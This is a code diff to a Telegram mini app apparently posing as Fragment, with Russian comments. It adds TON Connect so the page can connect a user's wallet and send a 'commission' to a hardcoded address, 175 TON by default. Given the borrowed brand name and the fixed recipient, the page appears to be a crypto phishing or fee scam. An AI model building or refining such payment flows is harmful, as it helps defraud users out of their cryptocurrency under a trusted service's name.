@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fragment - Mini App</title>
+    <!-- Подключаем TON Connect SDK -->
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
     <style>
         body {
             background-color: #1A1F2B;
@@ -349,6 +351,11 @@
         const tg = window.Telegram.WebApp;
         tg.ready();
 
+        // Инициализация TON Connect
+        const tonConnect = new TonConnectSDK.TonConnect({
+            manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json' // Замените на URL вашего манифеста
+        });
+
         // Загрузка данных из сервера
         async function loadConfig() {
             try {
@@ -375,31 +382,61 @@
         // Функция подключения кошелька и отправки транзакции
         async function connectWallet() {
             try {
-                // Шаг 1: Запрос подключения кошелька
+                // Проверяем, запущено ли приложение в Telegram
+                if (!tg.initData) {
+                    tg.showAlert('Ошибка: приложение должно быть запущено в Telegram.');
+                    return;
+                }
+
+                // Запрашиваем подключение кошелька
                 console.log('Запрашиваем подключение кошелька...');
-                tg.showAlert('Пожалуйста, подключите кошелёк. Откроется Telegram Wallet для привязки.');
-                tg.openTelegramLink('https://t.me/wallet?startapp=connect');
+                tg.showAlert('Пожалуйста, подключите кошелёк для продолжения.');
+                await tonConnect.connect();
 
-                // Задержка для того, чтобы пользователь успел подключить кошелёк
-                await new Promise(resolve => setTimeout(resolve, 5000));
+                // Проверяем, подключён ли кошелёк
+                if (!tonConnect.connected) {
+                    tg.showAlert('Кошелёк не подключён. Убедитесь, что у вас установлен Telegram Wallet, и попробуйте снова.');
+                    return;
+                }
 
-                // Шаг 2: Инициируем транзакцию после подключения
+                // Кошелёк подключён, продолжаем с транзакцией
+                console.log('Кошелёк подключён, инициируем транзакцию...');
                 const commissionTon = parseFloat(document.getElementById('commission-ton').textContent) || 175;
                 const commissionNanoTon = Math.round(commissionTon * 1e9); // Конвертируем TON в нанотокены
+
+                // Адрес получателя
                 const recipientAddress = 'UQCLVZxRULA5wbk2I_pSFD6XWYjUsUemNRZ6c5CaUCKAtlpq';
 
-                // Формируем ссылку для транзакции
-                const transactionLink = `https://t.me/wallet?start=transfer_${recipientAddress}_${commissionNanoTon}_Commission-payment`;
-                console.log('Инициируем транзакцию:', transactionLink);
+                // Создаём транзакцию
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
+                    messages: [
+                        {
+                            address: recipientAddress,
+                            amount: commissionNanoTon.toString(), // Сумма в нанотокенах
+                            payload: btoa('Commission payment') // Комментарий
+                        }
+                    ]
+                };
 
-                // Открываем кошелёк для подтверждения транзакции
-                tg.openTelegramLink(transactionLink);
+                // Отправляем транзакцию
+                const result = await tonConnect.sendTransaction(transaction);
 
-                // Уведомление
-                tg.showAlert(`Транзакция инициирована! Сумма комиссии (${commissionTon} TON) будет отправлена на адрес ${recipientAddress}. Подтвердите транзакцию в кошельке.`);
+                // Проверяем результат
+                if (result) {
+                    tg.showAlert(`Транзакция успешно отправлена! Сумма комиссии (${commissionTon} TON) отправлена на адрес ${recipientAddress}.`);
+                } else {
+                    tg.showAlert('Транзакция не выполнена. Проверьте баланс кошелька и попробуйте снова.');
+                }
             } catch (error) {
                 console.error('Ошибка:', error);
-                tg.showAlert(`Произошла ошибка: ${error.message}. Проверьте подключение кошелька и попробуйте снова.`);
+                if (error.message.includes('jsBridgeKey')) {
+                    tg.showAlert('Ошибка: Убедитесь, что приложение запущено в Telegram, и Telegram Wallet установлен.');
+                } else if (error.message.includes('manifest')) {
+                    tg.showAlert('Ошибка: Некорректный manifestUrl. Убедитесь, что tonconnect-manifest.json доступен на вашем сервере.');
+                } else {
+                    tg.showAlert(`Произошла ошибка: ${error.message}. Проверьте подключение кошелька и попробуйте снова.`);
+                }
             }
         }
 
